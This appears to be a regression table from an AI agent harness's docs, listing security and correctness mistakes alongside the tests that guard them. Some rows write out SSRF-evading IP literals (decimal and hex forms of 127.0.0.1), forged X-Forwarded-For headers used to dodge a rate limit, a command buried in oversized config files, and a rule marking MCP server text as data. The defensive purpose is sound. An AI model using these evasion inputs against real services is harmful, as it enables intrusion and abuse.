| **Letting ARCHITECTURE's record shape drift from `load_pipeline_run`** | `test_the_documented_record_shape_matches_what_load_returns` | Batch 154 (S09-04, A52). A relation, not a pinned number: the count and the field names are read out of the prose and compared to the keys the function returns. T2 and E13 each grew the record by a column and left thirteen sentences behind. The past-tense accounts in DEVLOG and ROADMAP are untouched and must stay that way -- they are the record of what the function was |
| **Reading `model` or `provider` out of frontmatter without typing it** | `test_a_non_string_model_skips_the_file`, `test_a_non_string_provider_skips_the_file` | Batch 155 (S08-01, A55). `_parse_md_file` states "ELEMENT TYPES TOO, not just the container" in a comment and these two sat under it unchecked. Measured through the real resolvers: `model: [a, b]` loads as a list and raises `TypeError: unhashable type: 'list'` from the effort cache's `(provider_name, model)` key, in a subagent spawn or a `/agent` turn; `provider: 123` raises `ValueError: Unknown provider: 123` out of `client.api_initialization`, naming the provider and not the file. Both arrive there through `agents/subagent_tool.py` and `tui/app.py`, which pass `agent.model or ...` verbatim |
| **Repairing a bad `model` or `provider` to `None` instead of skipping the file** | `test_a_non_string_model_skips_the_file` (the agent must be ABSENT, not present with `model=None`) | Batch 155 (A55). This is where the contract parts company with `max_steps` (#45) deliberately. `None` is a REAL value for both fields and means "inherit the session's", so a repair leaves the agent available and running on a model nobody chose for it -- and a file names a model when being a DIFFERENT model is the point, of which §11's critic rationale is the sharp case. A bad `max_steps` has no honest reading, so repairing it invents nothing |
| **Checking `allowed_tools`' container and not its elements** | `test_a_non_string_allowed_tools_element_skips_the_file`, `test_an_unhashable_allowed_tools_element_skips_the_file`, `test_a_yaml_boolean_in_allowed_tools_skips_the_file` | Batch 155 (S08-01, A55). The two consumers fail in OPPOSITE directions and both are measured. A hashable non-string (`[read, 123]`) survives `set()` and matches nothing, so the whitelist holds one entry fewer than it reads as -- the whitelist-typo class, silent. An unhashable one (`[read, [write]]`, `[read, {write: true}]`) raises `TypeError: unhashable type` out of `AgentManager.active_context` and `child_context`, the single place this `Optional[list]` becomes `ToolContext.allowed_tools`'s declared `Optional[set[str]]`. The finding called this half silent; measurement found it half loud. `[read, on]` is the third test because YAML reads `on`/`yes`/`true` as booleans |
| **Letting a `KeyError`, `TypeError` or `YAMLError` out of a `config_edit` reader** | `test_a_removed_key_names_the_file_and_the_remedy`, `test_a_flattened_table_names_the_file_and_the_remedy`, `test_a_file_that_no_longer_parses_names_the_file_and_the_remedy`, `test_every_reader_answers_the_same_way` | Batch 155 (S08-02, A56). `config.py` binds at import and nothing re-reads the file (UN1), while `explain()` says "Edit it in config.yaml" -- so a hand-edit mid-session is the documented workflow and not an edge case. Four shapes reached the readers and one was a `ValueError`: a removed or renamed key is a `KeyError`, a table flattened to a scalar is a `TypeError` from the SECOND subscript, a file that no longer parses is a ruamel `YAMLError` deriving from `Exception` and nothing narrower. All five readers are asserted together, because a shell handling one shape per call site handles three of five. NOT a crash since batch 135 contained `dispatch()` -- what breaks is WHICH SENTENCE arrives |
| **Printing the generic failure where the loader has a sentence** | `test_one_argument_says_the_file_moved`, `test_a_bare_config_says_the_file_moved`, with `test_an_untouched_copy_still_answers` as the control | Batch 155 (A56). None of these is a `pytest.raises`: not raising was never the difficult part. "/config failed. The error is in logs/app.log; the session is intact." is true and is an answer to a different question than the one a person who just edited that file asked. The producer decides what there is to SAY (§16's rule for this module) and the shell decides where to put it |
| **Letting a bare `/config` preface its failure with output** | `test_a_bare_config_says_the_file_moved` (exactly ONE error line and NO system lines) | Batch 155 (A56). The count is the first thing that handler reads, so a file it cannot read has to stop the command rather than describe four things about it first. Zero errors is the other direction and means the handler raised, so the generic sentence arrived instead. A `pending_changes(rows)` parameter was written here too and reverted in the same batch: the story justifying it -- two failures in one command -- cannot happen, because the guarded read returns |
| **Bounding a trust-prompt section on lines alone, or on characters alone** | `test_one_enormous_line_is_bounded_too`, `test_the_hub_is_bounded_on_both_axes_now` | Batch 155 (S08-03, A54). §44 gave the hub a LINE bound and nothing else, and the finding cited it as the shape to copy. Measured: a 2 MB `AGENTS.md` written as one line prints all 2 MB in four lines, and twenty 100 KB lines print 2 MB from INSIDE the twenty-line cap. A char bound alone fails the other way -- 30,000 short lines are 2.4 MB of prompt. `_bounded` takes 60 lines AND 6,000 characters and cuts WITHIN a line rather than dropping it, because a file flooded onto one line has exactly one line and it is the line the section is about |
| **Pasting any trust-prompt section whole** | `test_an_unbounded_settings_file_is_bounded`, `test_an_unbounded_mcp_file_is_bounded`, `test_the_file_listing_is_bounded`, `test_the_catalog_is_bounded_by_entry_count_not_only_entry_length` | Batch 155 (S08-03, A54). The finding named one of four sections. Measured: 2 x 2.2 MB of JSON rendered as 4.5 MB in 30 lines with the `mcp.json` command the section exists to show at 99.9994% of the way in; 20,000 padding files were 20,001 lines of listing; 3,000 project agents were 1 MB of catalog with every description individually inside A5's 300-char cap. Every test asserts on the WHOLE prompt rather than its own section, because a per-section assertion passes while three other channels are open |
| **Cutting a trust-prompt section without saying what was withheld** | `test_the_marker_says_how_much_and_that_trust_covers_it_all` | Batch 155 (A54). A cut nobody is told about turns a bounded prompt into one that misrepresents what it covers. What the bound buys is not that a buried command becomes visible -- it is that the BURIAL does, and only the marker can say so. It names lines and characters and states that trust covers the whole file, because an ellipsis on its own reads as "and a bit more" |
| **Tightening `_SECTION_LINES` or `_SECTION_CHARS` until an ordinary project is cut** | `test_a_project_of_ordinary_size_renders_whole` | Batch 155 (A54). The numbers were measured against the largest LEGITIMATE shapes rather than picked: a five-server pretty-printed `mcp.json` is 54 lines and 923 characters, a realistic `settings.json` is 14 and 264, and this project's own `AGENTS.md` is 4,033 characters in its first 60 lines. A cap that trims ordinary files turns its own marker into noise, and then the marker stops being read on the files it is for |
| **Bounding `content_files()` itself** | `test_the_file_listing_is_bounded` (which asserts the LISTING is still 5,000 entries) | Batch 155 (A54). The hash and `workspace_trust`'s invariant -- the loader must read no file the trust listing omits -- are about that function, so bounding it would silently shrink what a grant covers. What is bounded is what the prompt PRINTS of its answer, and the test asserts both halves so a later reader cannot confuse them |
| **Letting ARCHITECTURE's settable-scalar figure drift from the catalogue** | `test_the_documented_settable_scalar_count_is_the_one_the_test_walks` | Batch 155 (A57). A53's shape applied to the figure that had already earned it: the sentence says the sweep covers "all N settable scalars" and in the SAME parenthesis records that the figure was written as 113 in batch 84 and left there through five batches that added thirty keys -- and by batch 155 it had drifted again, to 143 against 145. The predicate is one function the sweep and the gate both call, so the gate cannot pass against a figure that is right about a different set of rows |
| **Re-adding `get_leaf` to `config_edit`** | nothing -- it is a convention, and `_in_file`'s docstring is where it is written down | Batch 155 (A56). It read a dotted name off a round-trip tree, had no caller anywhere in the repository, and was named by no document. `_in_file` answers the same question and translates the two exceptions, so restoring `get_leaf` would put back an untranslated second answer beside the one every reader now shares |
| **Cutting third-party text in `web_search` or `arxiv_search` before redacting it** | `test_no_interior_cut_leaves_the_secret` (four cuts), `test_no_interior_cut_leaves_the_secret_recoverable` (ten patterns) | Batch 156 (S05-02, A59). RB1's defect in the two tools RB1 did not reach. Both cut their text and let `registry.dispatch`'s `check_output_policy` redact the piece that was kept, and a pattern only matches what it can see whole. Measured: a `ghp_` token straddling any of the three existing cuts survived post-hoc redaction at 36 of the 39 offsets it could straddle, and redacting the whole value first caught every one. Every test drives `registry.dispatch` rather than the redactor, which is Trap 14 and the reason `test_redact_before_cut.py` exists in that shape -- a test that invokes the redactor cannot see an ordering defect |
| **Adding a new cap to either search tool without putting it through `ThirdPartyText`** | `test_no_interior_cut_leaves_the_secret` is parametrized over a TABLE of cuts; a cut missing from that table is a cut nothing sweeps | Batch 156 (A59). Each new cap is a NEW CUT, so A58's six bounds would have manufactured four more straddle sites had the ordering not landed first. The table in `SEARCH_CUTS` is the extension point: a sixth cut adds a row there, and the sweep covers it for free. This is how §51 came to ship a cut with the redactor below it -- nothing mechanical forced the question to be asked |
| **Measuring a truncation flag on a value's RAW length** | `test_a_value_redaction_shrinks_under_the_cap_is_not_flagged`, with `test_the_same_length_of_CLEAN_text_is_still_flagged` as the control | Batch 156 (A59, RB3's consequence). `[REDACTED]` is ten characters where a `ghp_` token is forty, so redaction can bring a value back under the cap -- measured, 621 characters of abstract becoming 591 against a cap of 600. A flag read off the raw length then claims the abstract was cut AND offers a `full_summary_url` to recover text the model already has in full. THIS TEST EXISTS BECAUSE A CONTROL PROVED IT MISSING: C18 made exactly this change and every other row in the file stayed green, because they all use clean text where the two lengths are equal |
| **Bounding a list of third-party values and not the values in it** | `test_one_enormous_author_name_is_cut`, `test_one_enormous_category_term_is_cut`, `test_a_full_list_of_enormous_names_is_bounded_on_both_axes` | Batch 156 (S05-01, A58). Batch 126 asked "which axis" and answered it for the lists: 25 authors, 20 categories. 25 authors at 5,000 characters each is 125,000 characters of model-facing text that every count-based cap reports as bounded. The product is what the third test asserts, because neither cap alone bounds it. The caps are DERIVED from the longest legitimate shape of each value -- a collaboration byline is 32 characters, arXiv's longest taxonomy term `cond-mat.stat-mech` is 18 -- so `test_an_ordinary_entry_is_byte_identical` is the row that stops a later tightening |
| **Cutting a URL-shaped value instead of dropping it** | `test_an_over_long_pdf_url_is_absent_and_flagged`, `test_a_pdf_url_at_the_bound_is_kept_whole`, `test_a_search_result_with_an_unusable_url_is_dropped_whole` | Batch 156 (A58). Half an abstract is still an abstract; half a URL is a fetchable-looking string that is not the resource, and `pdf_url` and the `full_*_url` pair exist precisely to BE the route the model takes. No production code consumes any of them -- the only references are the three lines that build them -- so they are there to be shown and fetched, and a cut one spends a tool call proving itself broken. For `web_search` the url is the result's IDENTITY, so an unusable one drops the row, which is the call that function already made for a url its policy filter refuses |
| **Spelling the URL bound again instead of reading `MAX_URL_CHARS`** | `test_the_url_bound_is_the_one_fetch_url_accepts` | Batch 156 (A58). A RELATION over two live values, not a third copy of 400: the constraint is read off `FetchURLParams.url`'s pydantic metadata. This is what makes the drop a derivation rather than a taste -- measured, a 401-character URL is refused by fetch_url's own gate and a 400-character one is accepted, so a URL these tools OFFER past that length is a route this harness refuses to take. Two files holding one number is the state a pair is in just before it stops being a pair |
| **Building `full_summary_url` or `full_authors_url` from a cut `arxiv_id`** | `test_neither_recovery_route_is_offered_for_a_cut_id`, with `test_an_ordinary_id_still_gets_both_routes` as the control | Batch 156 (A58). `arxiv_id` is not merely displayed: both routes are `https://arxiv.org/abs/{arxiv_id}`, so one uncapped field was three uncapped values wearing one name -- measured, a 5,000-character `<id>` made each route 5,022 characters long. PG4 exists so the model can reach what it WANTED, and a route assembled from half an id answers a question nobody asked. `id_truncated` still says the id was cut, which is the fact the model has no other way to learn, since a cut id is a citation that does not resolve |
| **Letting a refusal leave `dispatch()` without passing `check_output_policy`** | `test_a_credential_in_a_refused_argument_does_not_come_back`, `test_every_refusal_family_goes_through_the_redactor` | Batch 156 (S03-02, A60). `dispatch()` has exactly two `return`s and only the second passed the redactor. The finding rated this S4 on "no reachable secret-bearing refusal input" and that premise was false: of the eight tools carrying a `refusal_check`, seven render a field name and never a value (`invalid_params`' discipline, swept over every registered param model, zero echoes) and the eighth interpolates the model-supplied `agent_name`, so `spawn_subagent` with a `ghp_` token in it returned the whole credential. The relation test is the guard that survives the next tool -- the sink is gone rather than its authors being better-read. `test_the_input_scanner_would_have_caught_it_too` records WHY this is a security finding: `check_input_policy` refuses the same params and runs BELOW the refusal return, so one path skipped both scanners |
| **Rewording a refusal so it no longer names what was not found** | `test_the_refusal_still_says_which_name_was_not_found` | Batch 156 (A60). The control that keeps the fix at the sink. An ordinary mistyped name is what makes that refusal actionable, so a fix that stopped interpolating it would pass the redaction test by making the message useless. `tools/base.py` still asks producers not to echo a VALUE, on a reason that changed with this batch: register item 52 measured sixteen of twenty-two credential shapes surviving the redactor, so a refusal that does not echo cannot leak what no pattern knows |
| **Raising out of `_normalize` on one malformed provider row** | `test_a_wrong_typed_title_does_not_fail_the_search` (five shapes), `test_the_provider_is_called_once_not_three_times`, `test_a_row_that_is_not_a_row_at_all_is_skipped` | Batch 156 (A61). `arxiv._parse_atom_feed` learned this in batch 117 -- "SKIPPED, NOT RAISED ... Raising here aborted the whole search over one malformed entry" -- and `web_search` never did. THE KEY IS PRESENT, which is the trap: `r.get("title", "(untitled)")` substitutes only for an ABSENT key, and `{"title": null}` is a present one. Measured, one such row raised `ValidationError`, which `run` caught as a failed attempt, RETRIED TWICE, and reported as "search failed after 3 attempts" -- ten good results lost to one bad one. The call-count test is the half a result-shape assertion misses |
| **Returning every row the provider sent** | `test_web_search_keeps_only_what_was_asked_for`, `test_arxiv_keeps_only_what_was_asked_for`, `test_neither_tool_can_return_more_than_its_schema_advertises` | Batch 156 (S05-01's third bullet, A62). The axis that multiplies every other cap in this batch. Both schemas advertise a bound -- `num_results` is `le=10`, `max_results` is `le=20` -- and neither was enforced on the way OUT: measured, a request for five results was handed 5,000 rows and returned all 5,000. A DOCUMENTED BOUND BEING KEPT rather than a new policy, which is why it is a slice. The finding wants a byte ceiling on the `ddgs` response and that is not available -- the library buffers the body and owns the socket -- but what this layer keeps is the quantity that reaches the model |
| **Cutting arXiv's `total_results` along with its rows** | `test_arxivs_total_still_reports_what_the_QUERY_has` | Batch 156 (A62). Its whole job is saying what was NOT returned, which a count of what WAS cannot -- so cutting the rows and leaving the total is the correct pair, and cutting both deletes the signal that there is more. `test_a_provider_returning_FEWER_rows_is_not_padded` is the other control: a bound that became a floor would satisfy every count assertion and invent results |
| **Restoring "an IP LITERAL is still checked" to `_normalize`'s comment** | nothing -- it is a comment, and register item 53 holds the behaviour half | Batch 156. Measured: with `resolve=False`, which is what that filter uses, `http://2130706433/` (decimal for 127.0.0.1), `http://0x7f.0.0.1/` and `http://0x7F000001/` are all ALLOWED, because `ipaddress.ip_address` parses none of them and the "name is taken on trust" branch takes them. All three are refused on the resolving path, which is the only socket-opener in the scope, so no SSRF follows -- what is left is one wasted tool call. The comment now claims a dotted-decimal or bracketed IPv6 literal, which is what the code does |
| **Driving the push-channel gate in the working tree** | `test_the_push_channel_ignores_every_sample_that_claims_it`, whose driver `_unignored_in_a_fresh_clone` BUILDS the tree it measures | Batch 157 (A64). `git check-ignore` decides a directory-only pattern by asking the filesystem, so run in ROOT this gate answered for whatever the developer's tree contained. `logs/`, `output/` and `.ipynb_checkpoints/` all exist on a machine that has run the harness, because the harness creates them -- so the gate was green here for seventeen batches and red in all three jobs on its first push. The control is in the batch: with the old ROOT driver restored and the old sample back, the gate PASSES on this machine, which is the defect reproduced in place. A global `core.excludesFile` and `.git/info/exclude` can answer for the committed file too, which is why GIT_CONFIG_GLOBAL and GIT_CONFIG_SYSTEM are pointed at paths that do not exist rather than left alone |
| **Sampling a directory entry with a bare directory name** | the same gate -- a bare name is the one sample shape whose answer depends on what exists on disk | Batch 157 (A63). `logs` became `logs/app.log`, `output` became `output/run-1/report.md`, `.ipynb_checkpoints` became `.ipynb_checkpoints/system.md`. Not a workaround for the driver: the channel defends against `git add -A`, which stages FILES, so the question is only ever asked about a file -- and a path with a component after the slash is what tells git the component before it is a directory, which is already why `CLAUDE-SECURITY-2026-01-01/report.md` resolved while its three siblings did not. Samples stay at the ROOT because the archive gate shares this list and its matcher does not look for a segment in the middle of a path |
| **Declaring a `neverDistribute` pattern that no sample reaches** | `test_every_never_distribute_value_is_demonstrated_by_a_sample` | Batch 157 (A65). The sibling gate requires samples to EXIST; this one requires them to REACH, per the `match` kind the entry itself declares. `compiled python` declared `.pyc` and `__pycache__`, sampled only `x.pyc`, and `.gitignore` carried no `__pycache__` rule at all -- so the git channel claimed a pattern it did not have while npm enforced the same pattern wholesale through `files`, and the gates that exist to catch that disagreement had nothing to drive it with. It was the ONE undriven value in the list when it was written, which is the order B4 asks for |
| **Removing `__pycache__/` from `.gitignore`** | the push gate, through the `__pycache__/README.txt` sample the row above requires | Batch 157 (A65). `*.pyc` does not cover the directory, and CPython writes its byte-compile temp as `<target>.<pid>` inside it -- a name ending in digits, which `*.pyc` does not match -- so an interrupted compile left a file an `add -A` from the root would stage. Latent when found: all fifteen `__pycache__` entries in the tree were `.pyc` files and nothing was tracked under one. A `.pyc.<pid>` OUTSIDE a `__pycache__` directory is still not covered, deliberately: nothing writes one, and `*.pyc*` would be a pattern widened for a shape that does not occur |
| **Pressing `ctrl+c` twice in a test without pinning `QUIT_CONFIRM_S`** | the five pinned tests in `TestTheQuitGesture` -- and the relation that earns them: force the ambient window to 0.001s and all TEN still pass, where five failed before | Batch 157. The arm is released by `set_timer(QUIT_CONFIRM_S, self._disarm_quit)` and that is WALL CLOCK at 2.0s, while `pilot.pause()` costs 21ms idle against 1021ms with one busy sibling thread -- so a loaded run closes the window between the presses, the second `ctrl+c` re-arms instead of quitting, and the test fails. It did, in a 373-second suite run against the ~71 the previous batch measured. NOT TECHNICAL_DEBT 85's pump race: under that entry's own instrument (`Pilot.pause` to a bare `asyncio.sleep(0)`) the original assertion passes, and the predicate read off item 85 was inert here because `settle` polls for state that never arrives once the window has shut. The instrument that finds one defect hides the other |
| **Adding a shipped path to CodeQL's `paths-ignore`** | `test_codeql_ignores_only_what_never_ships` | Batch 158 (A66). `tests/` is skipped because `package.json`'s `files` does not ship it, and that is the whole licence: the gate walks every file `files` ships and fails when any `paths-ignore` entry covers one, reading a bare path as covering its contents and a leading `**/` as matching at the root. A false positive in shipped code is DISMISSED in GitHub with its reason instead, because a dismissal holds for one alert and a new flow into the same sink still reports. If tests/ should be scanned again, delete the config file and this gate together -- an empty list fails its vacuity check on purpose |
| **Putting `queries`, `query-filters` or `paths` in `codeql-config.yml`, or a CodeQL job that does not read it** | the same gate: it allows the keys `name` and `paths-ignore` only, and PARSES both `init` steps for `config-file` | Batch 158 (A66). Both jobs share the file, so a `queries` key there erases the security/quality split `codeql.yml` keeps per job on purpose, and a filter or `paths` narrows what shipped code is checked for -- the rule-level exclusion the owner declined. Parsed rather than grepped because the workflow's header names the file too, so a substring check passes with the key deleted (mutation A5's shape). Mutation pass: nine rows breaking what it reads, each red on its own message; three breaking its matcher, each red before and green after |
| **Letting `**` unpacking past `_validate_ast`** | `test_the_guard_refuses_before_anything_is_evaluated`, with `test_the_same_call_without_the_stars_reaches_evaluation` as the control | Batch 160 (A68, TECHNICAL_DEBT 55). `f(**m)` is `keyword(arg=None)` and `keyword` is listed, so the guard admitted it and SymPy refused it. The double raises if evaluation runs, so a refusal from anywhere but the guard fails the test. |
| **Resolving an empty workspace path** | `test_an_empty_workspace_is_refused_before_it_is_resolved`, `test_an_empty_variable_reaches_the_guard_as_an_empty_path` | Batch 160 (A69, TECHNICAL_DEBT 93). `realpath("")` is the launch directory. The second test chdirs to an unrelated directory ON PURPOSE: from the harness root the empty path resolves to the install tree and is refused for that reason, so a test run from there passes against the bug. |
| **Loading `.env` into `os.environ`, at import or anywhere** | `test_the_env_file_is_found_from_the_working_directory` (its three decoys), `test_a_dotenv_cannot_supply_a_harness_name`, `test_the_environment_still_answers_first` | Batch 160 (A70, TECHNICAL_DEBT 57). The first needs a fresh interpreter, which is why the import-time half lives in the batch-35 subprocess test rather than a sixth subprocess call: `tests/test_credentials.py`'s bandit baseline holds four. |
| **Dropping a vendor pattern or a structural shape** | the `REDACTION_CASES` rows and `test_every_pattern_and_every_shape_has_a_case`; the `SECRETS` rows in `test_redact_before_cut.py` for the cuts | Batch 160 (A71, TECHNICAL_DEBT 52). Add a pattern with a row in both lists, and a shape to `_every_matcher` too. The `pem private key block head` row is the only one that sees the header pattern's body: a whole block is also redacted from below by the footer walk. |
| **Widening a structural shape into prose, or into input refusals** | `test_prose_and_placeholders_survive`, `test_a_sentence_quoting_both_pem_markers_keeps_its_words`, `test_a_structural_shape_does_not_refuse_an_input`, `test_a_pem_header_alone_still_refuses_an_input` | Batch 160 (A71). The ruling's three lines: structural shapes are output only, prose quoting the anchors survives, and what the header pattern refuses on input did not narrow when it grew a body. |
| **Writing a PEM shape as a regex that starts at the first body line** | `test_the_pem_shapes_are_linear_on_a_megabyte` | Batch 160 (A71). Quadratic on a long base64 blob with no footer, because it is tried at every line start. The bound is generous (10 s against about 0.2 s measured), so a red here is the shape and not the machine. |
| **Showing the model or the display half a word across the dropped middle** | `TestTheDroppedMiddleShowsNoHalfOfAWord` (seven tests), with `test_a_cut_between_two_words_moves_nothing` and `test_the_monitor_still_reads_every_raw_character` as the controls | Batch 160 (A72, TECHNICAL_DEBT 95). A buffer test fed a stream with no word break now sees its tail moved into the gap, because the whole stream is one word: give it a space, as three existing tests were. |
| **Testing `.venastine/` membership by path alone** | `TestAHardlinkCannotReachTheProtectedFile` (eight tests) | Batch 160 (A73, TECHNICAL_DEBT 90). A hardlink is a second name, not a path. `test_the_atomic_write_still_spares_it_without_the_deny` stubs the inode check so the batch-146 layer stays pinned on its own. |
| **Reading a session's credential refusal anywhere but `note_exit`** | `TestTheExitIsHandedToTheCredentialQuarantine`, `TestASessionsRefusedLoginIsQuarantinedToo`, `TestASessionsRefusedPasswordIsQuarantined` | Batch 160 (A74, TECHNICAL_DEBT 51). `FakeSessionProcess.exit_notes` records what the manager handed over, so a double for a session process needs `note_exit`. The gates are exit 255 for SSH and non-zero for sudo; `test_a_remote_program_printing_it_does_not` is the reason. |
| **Printing an approval's text fields without revealing invisible characters** | `TestAnApprovalShowsWhatDrawsTextOutOfOrder`, `TestThePermissionModalShowsWhatDrawsTextOutOfOrder`, with `test_a_question_is_not_an_approval` as the scope's control | Batch 160 (A75, TECHNICAL_DEBT 104). Every character in those tests is written as an escape. An editing tool that decodes `\u` in its arguments writes the character itself, and bandit's B613 is what catches that in shipped code. |
| **Saying a server's text is data where no MCP tool is offered, or not saying it where one is** | `TestAnMcpToolsDescriptionIsSaidToBeTheServers` | Batch 160 (A76, TECHNICAL_DEBT 100). Decided by `schemas()` under the same three facts, so a headless run with an ungranted MCP tool is not told about a description it was never shown. |
| **Removing the tag comparison from `scripts/prepublish-check.mjs`, or calling it after `npm pack`** | `test_a_release_tag_that_is_not_the_version_is_refused_before_packing` (three near misses) | Batch 162 (A78, TECHNICAL_DEBT 115). The test runs the real script under Node with a fake `npm` that records being called, so a check that still refuses but only after packing fails on the marker file and not on the message. |
| **Comparing the tag by prefix or substring, or keying the check on `GITHUB_EVENT_NAME`** | the same test: `v{version}-rc.1` starts with the version, `{version}` contains it, and the test sets `GITHUB_REF_TYPE` without an event name | Batch 162 (A78). The comparison is exact, and it is keyed on the ref because a manual run started from a tag publishes from that tag's commit too. |
| **Refusing a tag that names the version, a branch run, or a run with no `GITHUB_*` at all** | `test_a_run_the_tag_check_has_no_quarrel_with_goes_on_to_pack` | Batch 162 (A78). The controls: each must reach the fake `npm`. Without Node both tests skip, except under `GITHUB_ACTIONS`, where they fail rather than skip (see "a revert check cannot see a test that SKIPS"). |
| **Making `save_credentials` read the merged view instead of the file** | `test_a_session_key_never_touches_the_disk` | Batch 163 (HD5). The overlay is laid over the file by `load_provider_data`, so a save that starts from it writes every session-only key to disk the next time ANY provider is saved -- the shared demo's whole rule undone by an unrelated `/connect`. `_load_file_data` is the file alone, and is what a writer reads |
| **Dropping `forget_client` from `connect.store`** | `test_persisting_writes_the_entry_and_forgets_the_cached_client` | Batch 163 (HD5). The client cache is keyed by provider name for the life of the process, so a reconnect without it keeps sending the OLD key until a restart -- a 401 that reads as the new key being wrong |
| **Sending scopes, or anything but `client_id`, to Hugging Face's device endpoint** | `test_the_start_sends_the_client_id_alone` | Batch 163 (HD5). Hugging Face's own sample sends the client id alone; the scopes are the app's registration, which is what keeps them from being widened from here |
| **Treating a stopped device-code wait as a failure** | `test_a_stopped_wait_is_cancelled_not_failed`, `test_cancel_stops_a_waiting_sign_in` | Batch 163 (HD5). The wait runs on a non-daemon worker; the unmount, every exit and `/connect cancel` stop it, and stopping is not an error to show |
| **Adding a `callback_url` to the OpenRouter authorization URL** | `test_the_url_carries_an_s256_challenge_and_no_callback` | Batch 163 (HD5). Without one OpenRouter shows the code to copy, which is what lets a terminal sign in with nothing listening for a redirect |
| **Opening a link with `webbrowser` under the web driver** | `test_under_the_web_driver_the_driver_opens_it` | Batch 163 (§79). In a browser tab the platform's browser is the server's; `App.open_url` hands the URL to the reader's own. `clickable` still runs first, which `test_a_refused_url_is_refused_on_both_routes` holds |
| **Reading `VENASTINE_HOSTED` at call time, or treating an unrecognised value as off** | `test_the_spellings`, `test_anything_unrecognised_is_the_restrictive_mode` | Batch 164 (HD4). The bridge is all that stands between a visitor and the container, so a typo must take capability away; and a value read at call time follows a mutation, `posture.py`'s reason for binding at import |
| **Dropping the hosted layer from `is_tool_allowed`, or moving it after the context check** | `TestASharedDeploymentRefusesTheContainerTools` | Batch 164 (HD4). With config.yaml saying yes to everything, a shared deployment must still refuse every container-reaching tool, and no agent or skill context may re-enable one |
| **Making the `prctl` call anywhere but first in `main()`, or in the bridge** | `test_main_marks_a_hosted_session_undumpable_first`, `test_the_call_really_clears_the_flag` | Batch 164 (HD6). An exec resets the flag, so the parent cannot make it for the child; and anything before it runs while the process is still readable |
| **Writing a server path for `/copy --file` in a browser or a shared deployment** | `test_copy_to_a_file_becomes_a_download` | Batch 164 (§79). Only the NAME of what was typed reaches the download; no directory a visitor names is touched |
| **Offering `/connect huggingface` where no client id makes it work** | `test_without_a_hugging_face_app_only_openrouter_is_offered`, `test_with_a_hugging_face_app_both_sign_ins_are_offered` | Batch 165 (HD5). Measured on the Space: the banner named it, and running it printed the token fallback followed at once by the pasted-token refusal. The banner, the list and the command panel all ask `_signs_in_here` |
| **Copying the bridge's environment into a session, or passing `PYTHONPATH`** | `test_it_carries_nothing_of_the_deployments` | Batch 165 (HD3). The assertion is that nothing of the base environment survives but `PATH` -- not a list of names to keep out, which is the shape a new secret walks past |
| **Keying the rate limit on the first `X-Forwarded-For` entry on Hugging Face** | `test_the_proxys_entry_not_the_clients`, `test_a_forged_first_entry_cannot_dodge_the_limit` | Batch 165 (HD8). Measured on the Space: the proxy APPENDS, so the first entry is the client's own, and a script naming a fresh address per request was never limited. Batch 166 made the entry per platform; on Hugging Face it is still the last |
| **Treating an unknown HTTP response as private, or a public marker as private under a different status** | `test_only_privacy_responses_allow_single_user_mode`, `test_a_public_marker_overrides_a_privacy_status`, `test_an_indeterminate_answer_can_recover_to_private`, `test_startup_errors_never_unlock_or_admit_a_public_session` | Batch 193 (HD7). An unmarked 200, 429 or 5xx at startup must not unlock config.yaml, issue a ticket or admit a websocket, even when the public app starts answering while that decision is cached; a recognized private response can recover at the next check |
| **Counting a redirect as a private answer** | `test_a_redirect_is_not_privacy`, with the 302 case of `test_it_runs_only_while_no_stranger_can_reach_it`, the whole-range test and a 301 at the bridge's start in `test_startup_errors_never_unlock_or_admit_a_public_session` | Batch 194 (HD7). Measured: Hugging Face answers plain http with a 301 to https before it asks whether the Space is private, so an `http://` `VENASTINE_PUBLIC_URL` on a public Space drew a redirect and unlocked the shell for every visitor. Neither platform answers privacy with a redirect (a private Space 404, a private Studio 403, the case the 403 row keeps allowed) |
| **Awaiting a session's stop unshielded, or forgetting the session before it has stopped** | `TestTheRoutes::test_end_to_end` | Batch 165 (HD8). Starlette's TestClient cancels the handler when its socket closes, as a server does at shutdown; the unshielded stop was interrupted at its first await, which left the child running and its whole directory in place -- the test found it. The test waits INSIDE the client's `with`, because the shielded stop needs the client's loop |
| **Building the session environment under `/root` when running as root** | `test_as_root_it_lives_where_nobody_can_import_from` | Batch 165 (HD2, HD11). Measured: `/root` is 0700 on the Space, and a math child that had become `nobody` could not import SymPy from beneath it |
| **Running a math call whose walls did not all go up** | `test_a_wall_that_will_not_go_up_means_the_call_does_not_run` | Batch 165 (HD11). There is no unconfined fallback: the child returns the reason and never reaches the handler |
| **Treating anything but the exact verdict as verified, or reading it from anywhere but the environment the bridge built** | `test_shared_runs_them_only_when_verified` (`verfied` is one of its rows), `test_the_verdict_reaches_every_session_and_nothing_else_sets_it` | Batch 165 (HD11). A base environment carrying `VENASTINE_CONFINEMENT=verified` must not reach a session; only the bridge's own self-test may set it |
| **Changing a denied number, the filter's jump arithmetic, or the x32 check** | `TestTheSeccompFilter` | Batch 165 (HD11). Run through a small classic-BPF interpreter, so it is tested on every platform: an off-by-one in a jump offset is silently "allow", and the x32 ABI reaches the same entry points one bit away |
| **A confined-tool list that drifts from the registry's compute tools** | `test_the_confined_tools_are_the_compute_tools` | Batch 165 (HD11). `security/hosted.py` cannot import the registry, so the six names are spelled there and pinned here |
| **An escape test without its unconfined control** | `test_each_escape_is_refused_and_the_control_is_not` | Batch 165 (HD11). A refusal from a child that could not have done the thing anyway proves nothing; each attempt must SUCCEED unconfined first. Fourteen mutations -- one per wall, switch and bridge fix in this batch -- were each killed |
| **Keying the rate limit on the last `X-Forwarded-For` entry on ModelScope, or choosing the entry by anything but the bundle's platform** | `test_on_modelscope_the_first_entry_is_the_client`, `test_on_modelscope_its_own_hops_do_not_split_one_visitor`, `test_the_platform_comes_from_the_bundle` | Batch 166 (HD8). Measured twice on the Studio: ModelScope's proxy REPLACES the header -- a hand-written TEST-NET-2 entry never arrived -- and rebuilds it as `[client, hop, hop]`, so the last entry is one of its own hops and keying on it put every visitor behind one counter. A platform not measured keeps the last |
| **Dropping `websockets` from `deploy/hosted/requirements.txt`** | `test_the_bridge_declares_the_websocket_library_uvicorn_needs` | Batch 166 (HD8). Without a websocket library uvicorn answers every upgrade 404 -- measured in a clean image. It had only worked because a Space's install line and ModelScope's image each happened to supply one |
